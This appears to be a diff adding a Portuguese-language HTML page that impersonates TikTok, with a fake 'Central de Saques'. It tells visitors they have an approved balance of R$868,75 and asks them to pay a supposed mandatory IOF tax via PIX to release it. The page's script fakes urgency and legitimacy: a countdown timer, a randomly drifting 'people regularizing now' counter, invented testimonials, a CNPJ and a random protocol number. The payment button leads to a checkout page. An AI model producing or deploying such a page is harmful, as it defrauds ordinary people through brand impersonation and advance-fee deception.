@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Taxa de Liberação — TikTok Recompensas</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-smoothing:antialiased;max-width:480px;margin:0 auto;min-height:100vh}
+
+/* Header TikTok */
+.header{background:#fff;border-bottom:1px solid #eee;padding:12px 16px;display:flex;align-items:center;justify-content:space-between}
+.header-brand{display:flex;align-items:center;gap:8px}
+.header-logo{width:28px;height:28px}
+.header-title{font-size:13px;font-weight:700;color:#111}
+.header-sub{font-size:10px;color:#888}
+.header-badge{background:#fe2c55;color:#fff;font-size:10px;font-weight:700;padding:3px 9px;border-radius:20px}
+
+/* Banner de sucesso */
+.success-banner{background:linear-gradient(135deg,#fe2c55,#ff6b35);padding:20px 16px;text-align:center;color:#fff}
+.success-icon{width:52px;height:52px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;font-size:24px}
+.success-title{font-size:18px;font-weight:900;margin-bottom:4px}
+.success-sub{font-size:13px;opacity:.85}
+
+/* Saldo card */
+.saldo-card{background:#fff;margin:12px;border-radius:14px;padding:18px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.saldo-lbl{font-size:11px;font-weight:600;color:#888;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
+.saldo-val{font-size:42px;font-weight:900;color:#111;letter-spacing:-0.03em;line-height:1;margin-bottom:4px}
+.saldo-sub{font-size:12px;color:#888;display:flex;align-items:center;gap:5px}
+.saldo-dot{width:7px;height:7px;border-radius:50%;background:#00b37e;flex-shrink:0}
+
+/* Steps */
+.steps{background:#fff;margin:0 12px 12px;border-radius:14px;padding:16px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.steps-title{font-size:12px;font-weight:700;color:#888;text-transform:uppercase;letter-spacing:.06em;margin-bottom:14px}
+.step-row{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.step-row:last-child{margin-bottom:0}
+.step-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:14px}
+.step-icon.done{background:#e6faf4}
+.step-icon.active{background:#fff3f5;border:2px solid #fe2c55}
+.step-icon.next{background:#f5f5f5}
+.step-info{flex:1}
+.step-name{font-size:13px;font-weight:700;color:#111}
+.step-name.muted{color:#bbb}
+.step-desc{font-size:11px;color:#888;margin-top:1px}
+.step-connector{width:2px;height:16px;background:#eee;margin-left:17px;margin-bottom:-4px;margin-top:-8px}
+
+/* IOF card */
+.iof-card{background:#fff;margin:0 12px 12px;border-radius:14px;padding:18px;box-shadow:0 2px 12px rgba(0,0,0,.06)}
+.iof-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.iof-title{font-size:14px;font-weight:800;color:#111}
+.iof-badge{background:#fff3f5;color:#fe2c55;font-size:10px;font-weight:700;padding:3px 8px;border-radius:6px}
+.iof-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f5f5f5}
+.iof-row:last-of-type{border-bottom:none}
+.iof-lbl{font-size:13px;color:#555}
+.iof-val{font-size:14px;font-weight:700;color:#111}
+.iof-val.red{color:#fe2c55}
+.iof-val.green{color:#00b37e}
+.receive-box{background:#f0faf6;border:1px solid #c8edd9;border-radius:10px;padding:11px 14px;margin-top:12px;display:flex;align-items:center;gap:8px;font-size:12px;color:#057a55;font-weight:600}
+
+/* Timer */
+.timer-card{background:#fff;margin:0 12px 12px;border-radius:14px;padding:14px 16px;box-shadow:0 2px 12px rgba(0,0,0,.06);display:flex;align-items:center;justify-content:space-between}
+.timer-left{display:flex;align-items:center;gap:8px;font-size:12px;color:#888;font-weight:600}
+.timer-dot{width:6px;height:6px;border-radius:50%;background:#fe2c55;animation:blink 1.2s ease infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+.timer-val{font-size:22px;font-weight:900;color:#111;font-variant-numeric:tabular-nums}
+
+/* Live */
+.live-bar{background:#fff;margin:0 12px 12px;border-radius:14px;padding:12px 16px;box-shadow:0 2px 12px rgba(0,0,0,.06);display:flex;align-items:center;gap:8px;font-size:12px;color:#555}
+.live-dot{width:6px;height:6px;border-radius:50%;background:#fe2c55;flex-shrink:0;animation:blink 1.2s ease infinite}
+
+/* Botão */
+.btn-wrap{padding:0 12px 16px}
+.pay-btn{width:100%;padding:17px;background:#fe2c55;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:900;font-family:'Inter',sans-serif;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:all .2s;text-transform:uppercase;letter-spacing:.02em;margin-bottom:8px}
+.pay-btn:hover{background:#e01f47;transform:translateY(-1px)}
+.pay-btn:active{transform:scale(.98)}
+@keyframes spin{to{transform:rotate(360deg)}}
+.btn-spinner{display:none;width:17px;height:17px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.pay-note{text-align:center;font-size:11px;color:#aaa}
+
+/* Depoimentos */
+.depos-wrap{padding:0 12px 20px}
+.depos-title{font-size:11px;font-weight:700;color:#aaa;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
+.depo{display:flex;gap:10px;background:#fff;border-radius:12px;padding:12px;margin-bottom:8px;box-shadow:0 1px 6px rgba(0,0,0,.04)}
+.depo-av{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0}
+.depo-name{font-size:12px;font-weight:700;color:#111}
+.depo-stars{font-size:10px;color:#f59e0b;margin-left:4px}
+.depo-text{font-size:12px;color:#666;margin-top:2px;line-height:1.4}
+.depo-check{font-size:10px;font-weight:700;color:#00b37e;margin-top:3px}
+
+/* Rodapé */
+.footer{background:#fff;border-top:1px solid #eee;padding:12px 16px;display:flex;justify-content:space-between}
+.foot-item{text-align:center}
+.foot-lbl{font-size:9px;color:#bbb;text-transform:uppercase;letter-spacing:.06em}
+.foot-val{font-size:10px;font-weight:600;color:#888;margin-top:1px}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-brand">
+    <svg width="28" height="28" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.18 8.18 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z" fill="#fe2c55"/></svg>
+    <div>
+      <div class="header-title">TikTok Recompensas</div>
+      <div class="header-sub">Central de Saques</div>
+    </div>
+  </div>
+  <div class="header-badge">SAQUE PENDENTE</div>
+</div>
+
+<!-- Banner sucesso -->
+<div class="success-banner">
+  <div class="success-icon">🎉</div>
+  <div class="success-title">Parabéns! Você foi selecionado</div>
+  <div class="success-sub">Seu saldo está disponível para saque</div>
+</div>
+
+<!-- Saldo -->
+<div class="saldo-card">
+  <div class="saldo-lbl">Saldo disponível para saque</div>
+  <div class="saldo-val" id="saldoVal">R$868,75</div>
+  <div class="saldo-sub">
+    <div class="saldo-dot"></div>
+    Aprovado · Aguardando regularização fiscal
+  </div>
+</div>
+
+<!-- Steps -->
+<div class="steps">
+  <div class="steps-title">Etapas para receber</div>
+  <div class="step-row">
+    <div class="step-icon done">✅</div>
+    <div class="step-info">
+      <div class="step-name">Saldo aprovado</div>
+      <div class="step-desc">R$868,75 disponível para saque</div>
+    </div>
+  </div>
+  <div class="step-connector"></div>
+  <div class="step-row">
+    <div class="step-icon active">⚠️</div>
+    <div class="step-info">
+      <div class="step-name">Pagar IOF obrigatório</div>
+      <div class="step-desc">Exigido pela legislação brasileira</div>
+    </div>
+  </div>
+  <div class="step-connector"></div>
+  <div class="step-row">
+    <div class="step-icon next">💸</div>
+    <div class="step-info">
+      <div class="step-name muted">Receber via PIX</div>
+      <div class="step-desc">Liberação imediata após pagamento</div>
+    </div>
+  </div>
+</div>
+
+<!-- IOF card -->
+<div class="iof-card">
+  <div class="iof-header">
+    <div class="iof-title">Resumo do saque</div>
+    <div class="iof-badge">AÇÃO NECESSÁRIA</div>
+  </div>
+  <div class="iof-row">
+    <span class="iof-lbl">Saldo a receber</span>
+    <span class="iof-val" id="iofSaldo">R$868,75</span>
+  </div>
+  <div class="iof-row">
+    <div>
+      <div class="iof-lbl">IOF — Lei nº 8.894/94</div>
+      <div style="font-size:10px;color:#aaa;margin-top:1px">Imposto sobre Operações Financeiras</div>
+    </div>
+    <span class="iof-val red" id="iofTaxa">- R$ 23,34</span>
+  </div>
+  <div class="iof-row">
+    <span class="iof-lbl" style="font-weight:700;color:#111">Total a receber</span>
+    <span class="iof-val green" id="iofTotal">R$868,75</span>
+  </div>
+  <div class="receive-box">
+    ✓ Após pagar o IOF seu saldo será liberado imediatamente via PIX
+  </div>
+</div>
+
+<!-- Timer -->
+<div class="timer-card">
+  <div class="timer-left">
+    <div class="timer-dot"></div>
+    Oferta expira em
+  </div>
+  <div class="timer-val" id="timerVal">15:00</div>
+</div>
+
+<!-- Live -->
+<div class="live-bar">
+  <div class="live-dot"></div>
+  <span><strong id="viewCount">43</strong> pessoas regularizando agora</span>
+</div>
+
+<!-- Botão -->
+<div class="btn-wrap">
+  <button class="pay-btn" id="payBtn" onclick="handleClick()">
+    <div class="btn-spinner" id="btnSpinner"></div>
+    <span id="btnText">PAGAR IOF E RECEBER R$868,75</span>
+  </button>
+  <p class="pay-note">🔒 Pagamento 100% seguro via PIX · Liberação imediata</p>
+</div>
+
+<!-- Depoimentos -->
+<div class="depos-wrap">
+  <div class="depos-title">Quem já recebeu</div>
+  <div class="depo">
+    <div class="depo-av" style="background:#fe2c55">CM</div>
+    <div>
+      <div><span class="depo-name">Carla M., SP</span><span class="depo-stars">★★★★★</span></div>
+      <div class="depo-text">Paguei o IOF e em 2 minutos o dinheiro caiu na minha conta. Fácil demais!</div>
+      <div class="depo-check">✓ Saque confirmado</div>
+    </div>
+  </div>
+  <div class="depo">
+    <div class="depo-av" style="background:#2b6cb0">RS</div>
+    <div>
+      <div><span class="depo-name">Rafael S., RJ</span><span class="depo-stars">★★★★</span></div>
+      <div class="depo-text">Demorei pra entender mas depois que paguei chegou tudo certinho. Vale a pena.</div>
+      <div class="depo-check">✓ Saque confirmado</div>
+    </div>
+  </div>
+  <div class="depo">
+    <div class="depo-av" style="background:#276749">JO</div>
+    <div>
+      <div><span class="depo-name">Julia O., MG</span><span class="depo-stars">★★★★★</span></div>
+      <div class="depo-text">Recebi o valor cheio, sem desconto nenhum. O IOF é obrigatório mesmo.</div>
+      <div class="depo-check">✓ Saque confirmado</div>
+    </div>
+  </div>
+</div>
+
+<!-- Rodapé -->
+<div class="footer">
+  <div class="foot-item"><div class="foot-lbl">CNPJ</div><div class="foot-val">13.141.251/0001-05</div></div>
+  <div class="foot-item"><div class="foot-lbl">Emissão</div><div class="foot-val" id="dataEmissao">—</div></div>
+  <div class="foot-item"><div class="foot-lbl">Protocolo</div><div class="foot-val" id="protoNum">—</div></div>
+</div>
+
+<script>
+(function(){
+  var IOF = 23.34;
+  var params = new URLSearchParams(window.location.search);
+  var total = parseFloat(params.get('total')) || 868.75;
+  var R = function(v){ return 'R$' + v.toFixed(2).replace('.',','); };
+  var R2 = function(v){ return 'R$ ' + v.toFixed(2).replace('.',','); };
+  var el = function(id){ return document.getElementById(id); };
+  var pad = function(n){ return String(n).padStart(2,'0'); };
+
+  if(el('saldoVal'))  el('saldoVal').textContent  = R(total);
+  if(el('iofSaldo'))  el('iofSaldo').textContent  = R(total);
+  if(el('iofTaxa'))   el('iofTaxa').textContent   = '- ' + R2(IOF);
+  if(el('iofTotal'))  el('iofTotal').textContent  = R(total);
+  if(el('btnText'))   el('btnText').textContent   = 'PAGAR IOF E RECEBER ' + R(total);
+
+  // Data e protocolo
+  var hoje = new Date();
+  var d = pad(hoje.getDate()), m = pad(hoje.getMonth()+1), a = hoje.getFullYear();
+  if(el('dataEmissao')) el('dataEmissao').textContent = d+'/'+m+'/'+a;
+  if(el('protoNum'))    el('protoNum').textContent    = 'TK-'+a+'-'+String(Math.floor(Math.random()*900000)+100000);
+
+  // Timer
+  var secs = 15*60;
+  setInterval(function(){
+    if(secs <= 0) return;
+    secs--;
+    if(el('timerVal')) el('timerVal').textContent = pad(Math.floor(secs/60))+':'+pad(secs%60);
+  }, 1000);
+
+  // Contador ao vivo
+  var base = 35 + Math.floor(Math.random()*20);
+  if(el('viewCount')) el('viewCount').textContent = base;
+  setInterval(function(){
+    base += Math.random() > 0.5 ? 1 : -1;
+    if(base < 28) base = 28; if(base > 72) base = 72;
+    if(el('viewCount')) el('viewCount').textContent = Math.round(base);
+  }, 4000);
+
+  // Botão
+  window.handleClick = function(){
+    var btn = el('payBtn');
+    if(btn.disabled) return;
+    btn.disabled = true;
+    el('btnSpinner').style.display = 'block';
+    el('btnText').textContent = 'AGUARDE...';
+    setTimeout(function(){
+      btn.disabled = false;
+      el('btnSpinner').style.display = 'none';
+      el('btnText').textContent = 'PAGAR IOF E RECEBER ' + R(total);
+      var p = window.location.search;
+      window.location.href = 'checkout.html' + (p ? p : '');
+    }, 600);
+  };
+})();
+</script>
+
+</body>
+</html>
